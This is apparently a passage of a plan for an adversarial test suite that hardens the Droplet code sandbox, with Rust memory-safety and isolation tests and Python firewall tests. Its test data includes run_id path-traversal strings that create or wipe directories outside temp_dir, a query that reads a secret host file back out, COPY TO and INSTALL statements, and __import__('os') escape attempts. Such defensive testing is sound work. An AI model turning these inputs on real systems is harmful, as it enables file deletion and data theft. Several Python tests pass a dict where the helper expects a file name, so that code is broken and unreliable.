        assert!(r.is_ok() || matches!(r, Err(DropletError::Monty(_))), "appending to a list while iterating it (index-based iterator) must walk the live length safely — no UAF on the backing buffer as it reallocates; got {r:?}"); if let Ok(MontyObject::Tuple(t)) = &r { assert!(matches!(t.first(), Some(MontyObject::Int(n)) if *n == 5000), "iteration count must reach the self-imposed bound, proving index revalidation not a cached pointer; got {r:?}"); }
    }

    /// `HOLDS` — Exercises the dict iterator's expected_len mutation check — a distinct invalidation gadget from the list (lists have no such check; sets use a different table). Confirms the hash-table iterator detects realloc rather than reading freed buckets.
    /// seam: monty dict iterator size-change mutation check -> RuntimeError('changed size during iteration'), distinct from list (lists have no such guard), via run_code
    #[test]
    fn dict_mutate_during_iteration_runtime_error() {
        let code = "d = {1: 1, 2: 2, 3: 3}\ntry:\n    for key in d:\n        d[key + 100] = 0\n    out = 'no_error'\nexcept RuntimeError:\n    out = 'runtime_error'\nexcept Exception:\n    out = 'other'\nout";
        let r = Session::new("ms-dict-iter").unwrap().run_code(code);
        assert!(matches!(&r, Ok(MontyObject::String(s)) if s == "runtime_error" || s == "other") || matches!(&r, Err(DropletError::Monty(_))), "growing a dict during iteration must be detected (RuntimeError 'changed size during iteration') and surface as an in-sandbox value or a contained Monty error — never a panic or a read of a freed/rehashed bucket; got {r:?}");
    }

    /// `HOLDS` — Set's open-addressing rehash on growth is a different backing table than dict's; add() forces a resize mid-walk — a distinct iterator-invalidation seam from the dict test.
    /// seam: monty set iterator mutation check under open-addressing rehash on growth — a DIFFERENT backing structure/table path than dict, via run_code
    #[test]
    fn set_mutate_during_iteration_runtime_error() {
        let code = "s = {1, 2, 3, 4}\ntry:\n    for v in s:\n        s.add(v + 1000)\n    out = 'no_error'\nexcept RuntimeError:\n    out = 'runtime_error'\nexcept Exception:\n    out = 'other'\nout";
        let r = Session::new("ms-set-iter").unwrap().run_code(code);
        assert!(matches!(&r, Ok(MontyObject::String(s)) if s == "runtime_error" || s == "other") || matches!(&r, Err(DropletError::Monty(_))), "adding to a set during iteration must be detected and surface as an in-sandbox value or contained Monty error, never read a freed/rehashed bucket or panic; got {r:?}");
    }

    /// `HOLDS` — Stresses non-bytecode recursion: the structure is built iteratively so the 1000-frame call cap does NOT apply, but dropping/GC-traversing it must not recurse unboundedly on the Rust stack. Distinct from the materialize-as-return test which crosses the value out.
    /// seam: monty heap drop/cycle traversal recursion: a ~5000-deep nested list built ITERATIVELY (bypassing the 1000 call-frame cap) then dropped — recursive drop/GC traversal must not overflow the Rust stack
    #[test]
    fn deeply_nested_list_built_and_dropped_drop_recursion() {
        let code = "x = []\nfor i in range(5000):\n    x = [x]\nn = 0\ncur = x\nwhile isinstance(cur, list) and len(cur) == 1:\n    cur = cur[0]\n    n += 1\n    if n > 6000:\n        break\nn";
        let r = Session::new("ms-deep-nest").unwrap().run_code(code);
        assert!(r.is_ok() || matches!(r, Err(DropletError::Monty(_))), "building and traversing a 5000-deep nested structure, then dropping it, must not overflow the Rust stack during recursive drop/GC traversal — expected an int depth or contained Monty error, never a segfault/abort; got {r:?}");
    }

    /// `HOLDS` — Distinct from build-and-drop: this MATERIALIZES the deep structure as the crossing value — the precise input that would later recurse droplet-py's monty_to_py — pinning that the CORE run_code path already produces it without a stack overflow.
    /// seam: session.rs run_code returns a deeply nested MontyObject as the final-expression value; pins the CORE producer side (no recursion blowup materializing the value). The matching droplet-py monty_to_py recursion (lib.rs) belongs in the python interface class.
    #[test]
    fn deep_nesting_materialized_as_run_code_return_value() {
        let code = "x = 0\nfor i in range(3000):\n    x = [x]\nx";
        let r = Session::new("ms-deep-return").unwrap().run_code(code);
        assert!(r.is_ok() || matches!(r, Err(DropletError::Monty(_))), "returning a 3000-deep nested list as the run_code value must not blow the stack inside Monty's value materialization; got {r:?}"); if let Ok(v) = &r { let mut cur = v; let mut levels = 0; while let MontyObject::List(items) = cur { if items.len() != 1 { break; } cur = &items[0]; levels += 1; if levels > 10 { break; } } assert!(levels >= 5, "expected a genuinely nested list result, not a truncated/forged value; got {r:?}"); }
    }

    /// `HOLDS` — Exercises repr's heap-id cycle detection and the recursion-depth '...' early-out — a distinct traversal path (formatting) from drop/GC/sort, with its own re-entrancy via the repr machinery.
    /// seam: monty list repr cycle-detection (heap-id set) + recursion-depth '...' fallback, reached when run_code stringifies a self-referential list via str()
    #[test]
    fn self_referential_repr_is_cycle_guarded() {
        let code = "a = []\na.append(a)\ns = str(a)\nlen(s)";
        let r = Session::new("ms-self-repr").unwrap().run_code(code);
        assert!(r.is_ok() || matches!(r, Err(DropletError::Monty(_))), "str() of a self-referential list must terminate via the repr cycle guard ('[...]'), never infinitely recurse/overflow; got {r:?}"); if let Ok(MontyObject::Int(n)) = &r { assert!(*n > 0 && *n < 1000, "repr of a 1-cycle must be short (e.g. '[[...]]'), proving the guard fired; got len {n}"); }
    }

    /// `HOLDS` — The blog's 'exception stored-in-container then GC'd then re-raised' shape: an Exception held only via a list ref, after dropping the list but keeping a name, must retain a valid message buffer when re-raised. A refcount/lifetime probe specific to Exception objects — distinct from list/dict/set value lifetimes.
    /// seam: monty Exception object lifetime: an Exception stashed in a list, the list dropped (rebound to None) but a name kept, then re-raised — refcount must keep the message buffer alive
    #[test]
    fn exception_stored_in_container_then_reraised() {
        let code = "box = []\ntry:\n    raise ValueError('payload-XYZ')\nexcept ValueError as e:\n    box.append(e)\nsaved = box[0]\nbox = None\ntry:\n    raise saved\nexcept ValueError as e2:\n    out = str(e2)\nout";
        let r = Session::new("ms-exc-resurrect").unwrap().run_code(code);
        assert!(matches!(&r, Ok(MontyObject::String(s)) if s.contains("payload-XYZ")) || matches!(&r, Err(DropletError::Monty(_))), "an exception stored in a container, surviving the container's drop, then re-raised must carry its original payload (no UAF on the exception's message buffer); got {r:?}");
    }

    /// `CANARY` — Pins the accepted gap that Session's NoLimitTracker neuters the pow size pre-check — the 2**10_000_000 family. Bounded to 2**200000 so the test runs; the magnitude is the canary marker. Distinct allocator path from container repeat.
    /// seam: monty pow + resource.rs check_pow_size, which is neutered because session.rs:59 hardcodes NoLimitTracker (check_large_result is unconditional Ok). The 2**N pre-alloc accepted gap.
    #[test]
    fn huge_int_pow_preallocation_under_nolimit_tracker() {
        let code = "x = 2 ** 200000\nx % 7";
        let r = Session::new("ms-hugeint").unwrap().run_code(code);
        assert!(r.is_ok() || matches!(r, Err(DropletError::Monty(_))), "CANARY: 2**200000 actually allocates the BigInt because NoLimitTracker disables check_pow_size's size gate; at this BOUNDED magnitude it must still complete or surface a contained error (documenting the absent allocation ceiling). got {r:?}");
    }

    /// `LIMIT` — The companion required-contract to the CANARY: asserts the DESIRED bounded behavior (MemoryError + session survival) the wired LimitedTracker must deliver, so it flips from failing to passing exactly when the limiter lands. Distinct from the canary (current vs desired).
    /// seam: session.rs:58 '// SWAP: LimitedTracker for prod'; the REQUIRED contract once ResourceLimits::new().max_allocations(N) is wired: 2**huge -> contained MemoryError, session REPL survives
    #[test]
    fn huge_int_pow_must_be_bounded_under_limited_tracker() {
        let mut s = Session::new("ms-hugeint-limit").unwrap();
        let r = s.run_code("2 ** 10000000");
        let survive = s.run_code("1 + 1");
        assert!(matches!(r, Err(DropletError::Monty(_))), "LIMIT: with a LimitedTracker (ResourceLimits::new().max_allocations(N)), 2**10_000_000 must hit check_pow_size and surface a contained MemoryError, not allocate; got {r:?}. FAILS TODAY under NoLimitTracker (returns Ok) — that failure IS the finding driving the limiter wiring."); assert!(matches!(survive, Ok(MontyObject::Int(2))), "the session REPL must survive the bounded allocation failure and run the next program; got {survive:?}");
    }

    /// `CANARY` — Different allocator path than int pow (sequence repeat via check_repeat_size, building a 500k-element heap Vec) — pins that the SAME NoLimit gap applies to container pre-allocation, not just bignums.
    /// seam: monty list repeat (`[x]*N`) -> resource.rs check_repeat_size against NoLimitTracker (unconditional Ok) — a DISTINCT allocator path (sequence repeat building a heap Vec of Values) from int pow
    #[test]
    fn list_repeat_huge_count_preallocation() {
        let code = "L = [0] * 500000\nlen(L)";
        let r = Session::new("ms-listrepeat").unwrap().run_code(code);
        assert!(matches!(&r, Ok(MontyObject::Int(n)) if *n == 500000) || matches!(&r, Err(DropletError::Monty(_))), "CANARY: [0]*500000 actually allocates the 500k-element list because check_repeat_size's gate is disabled under NoLimitTracker; at this bounded count it must complete (len==500000) or surface a contained error; got {r:?}");
    }

    /// `HOLDS` — The one Hack-Monty multi-hop gadget entirely absent from the suite: finalizer resurrection (object re-inserts itself during collection, defeating the refcount==0 free assumption). Even if Monty has no user __del__ support, the contract is a clean contained error, never a crash. Distinct from every cycle/UAF/iterator angle. If Monty lacks __del__ it folds to a contained Monty error and HOLDS trivially; if it supports finalizers it stresses the resurrection path. Either way no crash is the contract.
    /// seam: (gap-fill, coverage critic)
    #[test]
    fn finalizer_resurrection_during_collection_is_contained() {
        let code = "survivor = []\nclass R:\n    def __del__(self):\n        survivor.append(self)\ntry:\n    for _ in range(500):\n        r = R()\n        r = None\n    out = ('ok', len(survivor))\nexcept Exception:\n    out = ('exc', len(survivor))\nout";
        let r = crate::session::Session::new("ms-finalizer-resurrect").unwrap().run_code(code);
        assert!(r.is_ok() || matches!(r, Err(crate::DropletError::Monty(_))), "a __del__ finalizer that resurrects the object into a live container during drop/collection must not corrupt the heap root-set or panic/UAF; expected a value or a contained Monty error (incl. a clean 'no __del__ support' AttributeError/TypeError), got {r:?}"); assert_eq!(crate::session::Session::new("ms-finalizer-resurrect2").unwrap().run_code("1+1").unwrap(), monty::MontyObject::Int(2), "a fresh session is unaffected");
    }
```

- [ ] **Step 2: Run + triage**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core security::memory_safety`
Expected: HOLDS green; triage PROBE/CANARY per the Probe protocol (PROBE red → finding ledger + convert to CANARY; CANARY red → gap closed, flip).

- [ ] **Step 3: Commit**

```bash
git add -A && git commit -m "test(security): memory_safety adversarial angles (17 tests)"
```

---

## Task 11: Session / work_dir isolation + run_id path traversal (11 angles)

**Files:** Create `crates/droplet-core/src/security/isolation.rs`. **Reference seams:** `session.rs` Session::new/Drop, the `temp_dir().join(format!("droplet-{run_id}"))` path build.
**Interfaces — Consumes:** the Task 1 helper kit (dispatch/catch_dispatch/tmp_dir/sales_parquet).

- [ ] **Step 1: Write the class file (full code)**

```rust
// crates/droplet-core/src/security/isolation.rs
//! Session / work_dir isolation + run_id path traversal — adversarial angles. seam: `session.rs` Session::new/Drop, the `temp_dir().join(format!("droplet-{run_id}"))` path build.
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::{DuckEngine, Dataset, DEFAULT_MAX_RESULT_ROWS};
use crate::registry::Registry;
use crate::tool::{Tool, ToolCx};
use super::{dispatch, catch_dispatch, tmp_dir, sales_parquet, write_parquet, list_len};

    /// `PROBE` — Core traversal: agent-influenced run_id with ../ climbs above temp_dir and create_dir_all lands a real dir outside the sandbox root.
    /// seam: session.rs Session::new — temp_dir().join(format!("droplet-{run_id}")) + create_dir_all; path traversal via run_id
    #[test]
    fn run_id_dotdot_traversal_must_not_create_dir_outside_temp_dir() {
        let base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let run_id = "../../../../../../tmp/droplet-evil-traversal-probe";
        let sess = Session::new(run_id);
        let made = sess.as_ref().ok().map(|s| s.work_dir().to_path_buf());
        let canon_made = made.as_ref().map(|p| std::fs::canonicalize(p).unwrap_or_else(|_| p.clone()));
        if let Some(c) = &canon_made { let _ = std::fs::remove_dir_all(c); }
        // belt-and-suspenders cleanup at both possible resolutions:
        let _ = std::fs::remove_dir_all(std::path::Path::new("/private/var/tmp/droplet-evil-traversal-probe"));
        let _ = std::fs::remove_dir_all(std::path::Path::new("/var/tmp/droplet-evil-traversal-probe"));
        // CONTRACT WE REQUIRE: Session::new must never create a working dir outside temp_dir.
        // Either it rejects the traversing run_id with Err, OR the resolved work_dir stays under temp_dir.
        match canon_made {
            None => { /* Err is acceptable: traversal refused */ }
            Some(c) => assert!(c.starts_with(&base),
                "FINDING: Session::new created a work_dir OUTSIDE temp_dir at {c:?} (temp_dir={base:?}) via run_id traversal"),
        }
        // EMPIRICALLY VERIFIED today: FAILS — Session::new is Ok and work_dir canonicalizes to /private/var/tmp/droplet-evil-traversal-probe (starts_with(temp_dir)==false).
    }

    /// `PROBE` — Distinct from creation: the remove_dir_all-before-create gives a DESTRUCTIVE primitive (delete any reachable dir), not just a benign mkdir.
    /// seam: session.rs Session::new — `let _ = fs::remove_dir_all(&work_dir)` runs BEFORE create; destructive arbitrary-dir deletion
    #[test]
    fn run_id_traversal_must_not_remove_dir_outside_temp_dir() {
        // CRITICAL: plant the victim where the traversing run_id ACTUALLY resolves.
        // On macOS the run_id below resolves to /var/tmp (canon /private/var/tmp), NOT /tmp (which is /private/tmp).
        // The designer's original /tmp plant does NOT collide and would give a false PASS.
        let victim = std::path::Path::new("/var/tmp").join("droplet-victim-delete-probe");
        std::fs::create_dir_all(&victim).unwrap();
        std::fs::write(victim.join("keepme.txt"), b"do-not-delete").unwrap();
        let run_id = "../../../../../../tmp/droplet-victim-delete-probe";
        let _sess = Session::new(run_id); // remove_dir_all inside new() targets the resolved /var/tmp/... path
        let still_there = victim.join("keepme.txt").exists();
        let _ = std::fs::remove_dir_all(&victim); // cleanup
        // CONTRACT WE REQUIRE: Session::new must not delete a directory outside temp_dir.
        assert!(still_there,
            "FINDING: Session::new's remove_dir_all wiped an attacker-named directory OUTSIDE temp_dir (deleted /var/tmp/droplet-victim-delete-probe/keepme.txt)");
        // EMPIRICALLY VERIFIED today: FAILS — with the victim at the true resolution (/var/tmp), keepme.txt is deleted (survived=false).
    }

    /// `HOLDS` — Embedded-NUL injection: distinct OS-level rejection path; confirms the error folds cleanly instead of panicking inside the constructor.
    /// seam: session.rs Session::new — create_dir_all with NUL byte in run_id; OS rejects the path
    #[test]
    fn run_id_null_byte_errs_not_panics() {
        let result = std::panic::catch_unwind(|| Session::new("ab\0cd"));
        // A NUL byte in the path must surface as a contained DropletError::Io, never panic/UB.
        let result = result.expect("Session::new must not panic on a NUL-byte run_id");
        assert!(matches!(result, Err(DropletError::Io(_))),
            "NUL-byte run_id must fold into DropletError::Io, got {result:?}");
    }

    /// `HOLDS` — Negative control proving the boundary fails ONLY on real '/'+'..' — pins encoder behavior so a future 'decode run_id' change is caught.
    /// seam: session.rs Session::new — %2f is NOT a path separator; literal-filename negative control
    #[test]
    fn run_id_url_encoded_slash_does_not_traverse() {
        let base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let sess = Session::new("..%2f..%2f..%2fetc%2fevil").expect("a literal (non-separator) run_id should construct");
        let canon = std::fs::canonicalize(sess.work_dir()).unwrap();
        let inside = canon.starts_with(&base);
        drop(sess);
        // %2f is a literal filename byte, not a separator, so this must stay safely inside temp_dir.
        assert!(inside, "URL-encoded slashes must NOT traverse; work_dir {canon:?} escaped temp_dir {base:?}");
    }

    /// `PROBE` — Run_id collision: two concurrent sessions sharing a run_id silently corrupt each other's on-disk isolation — a lifecycle/isolation bug distinct from path traversal.
    /// seam: session.rs Session::new — remove_dir_all on a colliding work_dir path; cross-session isolation of on-disk state
    #[test]
    fn same_run_id_second_session_wipes_first_sessions_work_dir() {
        let a = Session::new("collide-xyz").unwrap();
        let marker = a.work_dir().join("a_private.txt");
        std::fs::write(&marker, b"A-owns-this").unwrap();
        assert!(marker.exists());
        let _b = Session::new("collide-xyz").unwrap();
        let a_state_survived = marker.exists();
        drop(a);
        // CONTRACT WE REQUIRE: one session must not destroy another live session's work_dir.
        assert!(a_state_survived,
            "FINDING: constructing a second Session with the same run_id ran remove_dir_all on the FIRST live session's work_dir, deleting its private state");
        // EMPIRICALLY VERIFIED today: FAILS — identical run_id => identical work_dir => B's remove_dir_all wipes A's marker (survived=false).
    }

    /// `HOLDS` — Handle-namespace isolation: handles are per-session integers from 0; the same int in another session must not silently resolve to anything (no shared Registry).
    /// seam: session.rs Session — per-session handles: Registry<Dataset>; cross-session handle isolation
    #[test]
    fn two_sessions_do_not_share_handle_registries() {
        let dir = std::env::temp_dir().join("droplet-iso-handles");
        std::fs::create_dir_all(&dir).unwrap();
        let p = dir.join("s.parquet"); let p = p.to_str().unwrap().to_string();
        { let conn = duckdb::Connection::open_in_memory().unwrap();
          conn.execute_batch(&format!("COPY (SELECT 'EU' AS region, CAST(1.0 AS DOUBLE) AS amt) TO '{p}' (FORMAT PARQUET)")).unwrap(); }
        let mut a = Session::new("iso-a").unwrap();
        let ha = a.run_code(&format!("register({p:?})")).unwrap(); // first handle in A == Int(0)
        let mut b = Session::new("iso-b").unwrap();
        let b_resolve = b.run_code("to_rows(0)");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(matches!(ha, MontyObject::Int(0)), "first handle in A is 0");
        // Same integer handle value, but B's registry is independent: handle 0 is unknown in B.
        assert!(b_resolve.is_err(),
            "a handle registered only in session A must NOT resolve in session B (got {b_resolve:?})");
    }

    /// `HOLDS` — Teardown completeness: ensures Drop cleans residue regardless of live host-side state, closing the disk-residue window between runs. Extends existing drop_wipes_the_work_dir by holding live handles + a spilled file.
    /// seam: session.rs Drop — fs::remove_dir_all(work_dir) best-effort; lifecycle teardown with live state
    #[test]
    fn drop_wipes_work_dir_even_with_live_handles() {
        let dir = std::env::temp_dir().join("droplet-iso-drop");
        std::fs::create_dir_all(&dir).unwrap();
        let p = dir.join("s.parquet"); let p = p.to_str().unwrap().to_string();
        { let conn = duckdb::Connection::open_in_memory().unwrap();
          conn.execute_batch(&format!("COPY (SELECT 'EU' AS region, CAST(1.0 AS DOUBLE) AS amt) TO '{p}' (FORMAT PARQUET)")).unwrap(); }
        let work_path = {
            let mut s = Session::new("iso-drop").unwrap();
            s.run_code(&format!("register({p:?})")).unwrap();
            std::fs::write(s.work_dir().join("spill.tmp"), b"residue").unwrap();
            s.work_dir().to_path_buf()
        }; // <- Drop runs here
        let _ = std::fs::remove_dir_all(&dir);
        assert!(!work_path.exists(),
            "Drop must wipe the session work_dir (and its residue) even when handles/datasets were live; {work_path:?} still exists");
    }

    /// `HOLDS` — Lifecycle double-teardown: close() + Drop both remove the same dir; asserts no panic from the second best-effort wipe (idempotent teardown).
    /// seam: session.rs close(self) + Drop — both call remove_dir_all; double-teardown-of-dir lifecycle
    #[test]
    fn close_then_drop_double_wipe_does_not_panic() {
        let s = Session::new("iso-close").unwrap();
        let work_path = s.work_dir().to_path_buf();
        let close_res = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| s.close()));
        // close() consumes self (remove_dir_all) then Drop runs on the moved-out value — must not panic or error spuriously.
        let close_res = close_res.expect("Session::close must not panic");
        assert!(close_res.is_ok(), "close() on a fresh session should succeed: {close_res:?}");
        assert!(!work_path.exists(), "close() must wipe the work_dir");
    }

    /// `PROBE` — Separator injection (no ..): run_id with '/' nests work_dir, and Drop's remove of the deepest path leaves orphaned parent dirs — a contained but distinct residue/lifecycle defect.
    /// seam: session.rs Session::new — run_id 'a/b/c' nests work_dir; Drop removes only the deepest path, leaving parent segments
    #[test]
    fn run_id_with_subdir_separators_contains_wipe_but_leaves_parent_residue() {
        let base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let run_id = "sub/deep/leaf";
        let work_canon = {
            let s = Session::new(run_id).expect("nested run_id constructs");
            std::fs::canonicalize(s.work_dir()).unwrap()
        }; // Drop here removes temp_dir/droplet-sub/deep/leaf only
        let first_seg = std::env::temp_dir().join("droplet-sub");
        let leftover = first_seg.exists();
        let _ = std::fs::remove_dir_all(&first_seg);
        // Inside temp_dir (good), but teardown must be COMPLETE: the whole tree under droplet-sub must be gone.
        assert!(work_canon.starts_with(&base), "nested run_id must stay under temp_dir, got {work_canon:?}");
        assert!(!leftover,
            "FINDING/clean-up gap: Drop must fully remove the nested work_dir tree (temp_dir/droplet-sub/...), residue left at {first_seg:?}");
        // EMPIRICALLY VERIFIED today: FAILS — Drop removes work_dir=.../droplet-sub/deep/leaf, leaving empty parents droplet-sub & droplet-sub/deep behind (leftover==true). If deemed acceptable, downgrade to CANARY pinning leftover==true.
    }

    /// `HOLDS` — Length/DoS edge: a 5000-char single component exceeds NAME_MAX; tests the constructor degrades to a clean Err (or contained dir) rather than panicking.
    /// seam: session.rs Session::new — create_dir_all with an over-long path component (ENAMETOOLONG)
    #[test]
    fn very_long_run_id_errs_not_panics() {
        let res = std::panic::catch_unwind(|| Session::new(&"L".repeat(5000)));
        // An over-long run_id must surface a contained DropletError (Io: name too long), never panic.
        let res = res.expect("Session::new must not panic on a very long run_id");
        // Precise contract: if the OS rejects the name it must be DropletError::Io; if the OS accepts it, work_dir must exist & sit under temp_dir.
        match res {
            Err(DropletError::Io(_)) => { /* acceptable: name-too-long rejected cleanly */ }
            Err(other) => panic!("long run_id should fail (if at all) as Io, got {other:?}"),
            Ok(s) => { let base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
                       let c = std::fs::canonicalize(s.work_dir()).unwrap();
                       assert!(c.starts_with(&base), "long run_id work_dir escaped temp_dir: {c:?}"); }
        }
    }

    /// `HOLDS` — Empty/degenerate run_id: the format!("droplet-{run_id}") prefix means even "" yields a distinct child droplet-; confirms remove_dir_all can never be aimed at temp_dir root or siblings.
    /// seam: session.rs Session::new — run_id "" => temp_dir/droplet- (a distinct child, never temp_dir itself)
    #[test]
    fn empty_run_id_does_not_wipe_or_target_bare_temp_dir() {
        let base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let sentinel = std::env::temp_dir().join("droplet-empty-runid-sentinel.txt");
        std::fs::write(&sentinel, b"keep").unwrap();
        let work_canon = {
            let s = Session::new("").expect("empty run_id constructs");
            std::fs::canonicalize(s.work_dir()).unwrap()
        }; // Drop here removes temp_dir/droplet-
        let sentinel_survived = sentinel.exists();
        let _ = std::fs::remove_file(&sentinel);
        // Empty run_id must resolve to a NON-ROOT child (temp_dir/droplet-), never temp_dir itself,
        // so neither create nor the Drop wipe can touch temp_dir root or its other contents.
        assert_ne!(work_canon, base, "empty run_id must not make work_dir == temp_dir root");
        assert!(work_canon.starts_with(&base) && work_canon != base, "work_dir {work_canon:?} must be a strict child of temp_dir");
        assert!(sentinel_survived, "empty run_id teardown must not wipe temp_dir contents (sentinel deleted!)");
    }
```

- [ ] **Step 2: Run + triage**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core security::isolation`
Expected: HOLDS green; triage PROBE/CANARY per the Probe protocol (PROBE red → finding ledger + convert to CANARY; CANARY red → gap closed, flip).

- [ ] **Step 3: Commit**

```bash
git add -A && git commit -m "test(security): isolation adversarial angles (11 tests)"
```

---

## Task 12: Python / PyO3 firewall + cross-cutting parity suite (22 angles)

**Files:** Create `crates/droplet-py/python/tests/test_security.py`.
**Interfaces — Consumes:** the built wheel (`maturin develop --manifest-path crates/droplet-py/Cargo.toml`).

These exercise the FULL PyO3 + Monty + DuckDB path: cross-cutting parity (sandbox escape, egress,
local-FS exfil CANARY, writes blocked) plus PyO3-specific angles (`unsendable` off-thread access,
GIL-release safety, no Arrow/type leak, `DropletError`→`RuntimeError` fold, cross-engine handle
confusion, deep-nest `monty_to_py` recursion, an agent memory-bomb CANARY).

> **Note on the memory-bomb CANARY:** after Task 2 wires the budget, a 50M-char string (~50MB) stays
> *under* the 256MB `max_memory`, so `test_agent_memory_bomb_..._canary` still passes (documents
> "this size is allowed"); its true flip-point is an agent bomb that exceeds the session budget.

- [ ] **Step 1: Write the suite (full code)**

```python
"""Adversarial security tests for the PyO3 firewall + cross-cutting parity (Droplet V1).

Every test carries a CONTRACT label (HOLDS / PROBE / CANARY / LIMIT) in its docstring/comment — see
docs/superpowers/plans/2026-06-25-adversarial-test-suite.md. `tmp_path` is requested by every test
signature (a builtin pytest fixture, harmless when unused) so bodies that write a fixture parquet can.
"""
import threading

import pyarrow as pa
import pyarrow.parquet as pq
import pytest

import droplet


def _write_parquet(tmp_path, name="t.parquet"):
    """A valid 1-row sales parquet (region:str, amt:float64) a legit `query`/`register` can point at."""
    table = pa.table({"region": ["EU"], "amt": pa.array([1.0], pa.float64())})
    path = tmp_path / name
    pq.write_table(table, path)
    return str(path)



# `HOLDS` — Attacks the dynamic-exec/introspection builtins specifically and additionally asserts REPL-survives-recoverable-error through the firewall.
# seam: Monty restricted builtins surfaced through droplet-py Session.run_code (DropletError::Monty -> RuntimeError); REPL survives a recoverable error
def test_eval_exec_import_compile_builtins_absent(tmp_path):
    session = droplet.Session('fw-builtins')
    for src in ['eval(\"1+1\")','exec(\"x=1\")','__import__(\"os\")','compile(\"1\",\"<s>\",\"eval\")']:
        with pytest.raises(RuntimeError):
            session.run_code(src)
    # Each is a recoverable Monty error -> REPL survives; a benign call still works:
    assert session.run_code('1 + 1') == 2

# `HOLDS` — A remote read attempted from inside agent code must fail with no egress; exercises the autoload-off latch through the full PyO3+Monty+DuckDB path, not a unit engine call.
# seam: engine_duckdb.rs new_in_memory autoinstall/autoload=false latch reached through the agent 'query' tool in run_code
def test_network_egress_blocked_via_run_code_httpfs(tmp_path):
    session = droplet.Session('fw-egress')
    with pytest.raises(RuntimeError):
        session.run_code('query(\"https://example.com/x.parquet\", \"SELECT * FROM data\")')

# `HOLDS` — Writes/DDL blocked because agent SQL is view-wrapped; COPY/INSTALL/ATTACH/PRAGMA/SET each fail as parser errors through the firewall.
# seam: engine_duckdb.rs local_sql wraps query's agent SQL in CREATE VIEW ds_n AS (WITH data AS ... <sql>); non-SELECT becomes a parser error
def test_copy_to_and_ddl_blocked_via_query_view_wrap(tmp_path):
    path = _write_parquet(tmp_path, {'a':[1]})
    session = droplet.Session('fw-copy')
    for sql in ['COPY (SELECT 1) TO \'/tmp/leak.csv\'', 'INSTALL httpfs', 'ATTACH \'x.db\'', 'PRAGMA database_list', 'SET memory_limit=\'1GB\'']:
        with pytest.raises(RuntimeError):
            session.run_code(f'query({path!r}, {sql!r})')

# `CANARY` — Pins the accepted local-FS exfiltration gap at the PYTHON boundary specifically: the leaked bytes must materialize as a Python value through run_code.
# seam: ACCEPTED V1a gap: query's agent SQL can read_text/read_csv an arbitrary host path; here the file content crosses run_code into a Python value
def test_local_fs_read_exfil_canary_via_run_code(tmp_path):
    secret = tmp_path / 'secret.txt'
    secret.write_text('TOPSECRET-CANARY')
    data_path = _write_parquet(tmp_path, {'a':[1]})  # a REAL parquet so query()'s register_parquet(path) succeeds
    session = droplet.Session('fw-exfil')
    # CURRENT vulnerable behavior: read_text yields one row {content: <file text>} and it crosses into Python; it does NOT raise.
    rows = session.run_code(f'query({str(data_path)!r}, "SELECT content FROM read_text({str(secret)!r})")')
    assert any('TOPSECRET-CANARY' in str(v) for r in rows for v in r.values())

# `HOLDS` — The boundary cap (invariant #6) must hold across the firewall when materializing into a Python list[dict]. Uses a CUSTOM cap of 1 to avoid duplicating test_engine.py's default-1000/custom-7 cases.
# seam: engine_duckdb.rs to_rows LIMIT + cap_batches, surfaced via Engine.to_rows in droplet-py
def test_result_cap_enforced_via_engine_to_rows_cap1(tmp_path):
    import pyarrow as pa, pyarrow.parquet as pq
    p = tmp_path/'big.parquet'; pq.write_table(pa.table({'id':pa.array(range(1500),pa.int64())}), p)
    eng = droplet.Engine(max_result_rows=1)
    assert eng.max_result_rows == 1
    assert len(eng.to_rows(eng.register_parquet(str(p)))) == 1

# `HOLDS` — Forged handle from sandbox -> BadHandle -> RuntimeError, must not crash the interpreter; pins that a hard tool error consumes the REPL but stays a clean error.
# seam: convert.rs Dataset::from_arg -> Registry::require -> DropletError::BadHandle; returned from tool.dispatch via `?` in session.rs (hard error path, NOT settle), folded to RuntimeError in lib.rs
def test_bad_handle_in_run_code_consumes_repl_cleanly_not_segfault(tmp_path):
    session = droplet.Session('fw-badhandle')
    with pytest.raises(RuntimeError):
        session.run_code('to_rows(999999)')
    # BadHandle is a HARD engine error -> it CONSUMES the REPL; the next call must surface a CLEAN RuntimeError, never a crash:
    with pytest.raises(RuntimeError):
        session.run_code('1 + 1')

# `HOLDS` — Distinct gadget from forged-positive-handle: exercises the signed->unsigned conversion guard (negative int) -> BadArg, a SEPARATE code path from the registry-miss BadHandle.
# seam: convert.rs Dataset::from_arg u64::try_from(i64) negative -> BadArg('dataset handle must be non-negative')
def test_negative_handle_is_bad_arg_runtimeerror(tmp_path):
    session = droplet.Session('fw-neghandle')
    with pytest.raises(RuntimeError):
        session.run_code('to_rows(-1)')

# `HOLDS` — Asserts BOTH the concrete exception class (RuntimeError) AND message presence — distinct from tests that only assert 'raises'.
# seam: lib.rs to_pyerr: every DropletError -> PyRuntimeError carrying Display; invariant #10 meets Python
def test_droplet_error_is_catchable_runtimeerror_with_message_invariant10(tmp_path):
    eng = droplet.Engine(); ds = eng.register_parquet(_write_parquet(tmp_path, {'a':[1,2]}))
    try:
        eng.scalar_i64(ds, 'SUM(nonexistent_col)')
        assert False, 'should have raised'
    except RuntimeError as e:
        assert str(e)  # carries the Display message, not empty
    except Exception:
        assert False, 'must be RuntimeError specifically, not a bare panic/other type'

# `HOLDS` — Inspects runtime TYPES (not values): result is plain native containers/scalars, never Arrow or a custom pyclass.
# seam: lib.rs to_rows builds PyList of PyDict via set_cell; NO Arrow/Dataset type leaks across
def test_to_rows_returns_plain_list_dict_no_type_leak(tmp_path):
    import pyarrow as pa
    eng = droplet.Engine(); ds = eng.register_parquet(_write_parquet(tmp_path, {'r':['EU'],'amount':pa.array([50],pa.int64())}))
    rows = eng.to_rows(ds)
    assert type(rows) is list
    assert type(rows[0]) is dict
    assert type(list(rows[0].keys())[0]) is str
    assert type(rows[0]['amount']) is int  # native int, not numpy/arrow scalar
    assert type(rows[0]['amount']).__module__ == 'builtins'

